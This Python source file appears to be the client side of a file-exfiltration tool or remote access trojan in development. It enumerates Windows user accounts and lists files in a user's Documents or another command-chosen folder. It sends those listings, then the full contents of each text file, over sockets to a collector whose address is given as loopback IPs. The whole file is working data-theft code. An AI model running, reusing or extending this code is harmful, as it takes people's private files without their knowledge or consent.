import os
from os import path, listdir
from os.path import isfile
from glob import glob
import socket
from pickle import dumps
import threading
import time
CONN_HOST = "127.0.0.2"
CONN_PORT = 65433 
folder = ""
sep = ":***:"

def getuser(): # Get all users from C:\Users\
    return [path.basename(x) for x in glob('C:\\Users\\*') if x not in ['C:\\Users\\Public', 'C:\\Users\\All Users', 'C:\\Users\\Default', 'C:\\Users\\Default User', 'C:\\Users\\desktop.ini']]

def getfiles(scan_user: str, dict_files: str):
    return [path.basename(x) for x in glob('C:\\Users\\'+scan_user+'\\'+dict_files+'\\*') if '.lnk' not in x]


# Created threads for each function cuz CLI wouldnt work without it
def start_FolderData(fol: str):
        FolderThread = threading.Thread(target=lambda: sendFolderData(fol))
        FolderThread.daemon = True
        FolderThread.start()
        FolderThread.join()

def start_sendFiles(filedir: str):
        FileThread = threading.Thread(target=lambda: sendFiles(filedir))
        FileThread.daemon = True
        FileThread.start()
        FileThread.join()


def sendFolderData(fol: str):
    global folder
    users = getuser()
    try:
        #! This should seperate the folder name from the command
        folder = fol.split('-')[2]
        local_files = getfiles(users[1], f"{folder}")
    except:
        try:
            local_files = getfiles(users[1], "Documents")
        except:
            local_files = getfiles(users[0], "Dokumenty")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as suck:
        suck.connect((CONN_HOST, CONN_PORT))
        print("File transfer socket connected.")
        suck.send(dumps(users))
        suck.send(dumps(local_files)) # Server have to use loads(data) from pickle library
    suck.close()
    print("Closed Folder Transfer socket.")



def sendFiles(filedir: str):
    print("SEND_FILES: started function")
    CONNF_HOST = "127.0.0.4"
    CONNF_PORT = 1930
    try:
        filedir = filedir.split('-')[2]
        print(f"Got {filedir}")
    except:
        filedir = "Documents"

    full_path =  "C:\\Users\\" + getuser()[0] + "\\" + filedir
    print(full_path)
    
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as suck:
        suck.connect((CONNF_HOST, CONNF_PORT))
        print("Connected socket")

        bannedtypes = [".lnk", ".rdp", ".ini",".jpg",".png",".webp",".gif",".mp4",".docx"]
        for filename in listdir(full_path): # Get each file in folder
            if isfile("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename) and not filename.endswith(tuple(bannedtypes)):
                print("LOOP Got filename: ", filename)
                # TODO find a way to send pdf/word documents over the socket without converting them to bytes
                
                # Send Filename 
                if filename.endswith(".txt"):
                    time.sleep(3)
                    msg = f"FILENAME_TEXT{sep}{filename}"
                    remain = len(msg) - 77 
                    if remain !=0:
                        msg = f"FILENAME_TEXT{sep}{filename}" + f" "* (remain*-1) 
                        print("Sent filename Packet:", msg)
                    suck.send(msg.encode("utf-8")) # FILENAME:{filename}

                    # THIS WILL OPEN THE FILE AS READ BYTES
                    dict_files = open("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename, "r")
                    print("Got file dir: ", dict_files.name)

                    # ? Send the filesize before the data
                    file_size = os.path.getsize("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename)
                    msg = f"TXT_DATA{sep}{file_size}"
                    remain = len(msg) - 77 
                    
                    if remain !=0:
                        msg = f"TXT_DATA{sep}{file_size}" + f" "* (remain*-1) 
                    suck.send(msg.encode("utf-8"))
                    print(msg, len(msg))

                    file_data = dict_files.read(64)
                    while(file_data):
                        print(":::::::::::::::::::::::::::::::::::::::::::::::::::::")        
                        #print(f"HEADER SIZE: {len(aad)}, {aad}" )
                        print(type(file_data), len(file_data), file_data)
                        print(type(file_data.encode("utf-8")), len(file_data.encode("utf-8")), file_data.encode("utf-8"))
                        print(":::::::::::::::::::::::::::::::::::::::::::::::::::::")

                        suck.send(file_data.encode("utf-8"))
                        msg = ""
                        file_data = dict_files.read(64)

                    for i in range(3):
                        suck.send("::END_OF_THE_SOCKET::".encode("utf-8"))
                
                    # TODO PUT THE 77 BYTES CHECKER INTO A FUNCTION CUZ I USE IT A LOT
                    #time.sleep(0.5)
                    
                    msg = f"FINISH{sep}Completed"
                    remain = len(msg) - 77     
                    if remain !=0:
                        msg = f"FINISH{sep}Completed" + f" "* (remain*-1) 
                    suck.send(msg.encode("utf-8"))                        
                    time.sleep(1)

                print(f"Transfer completed: {msg}")
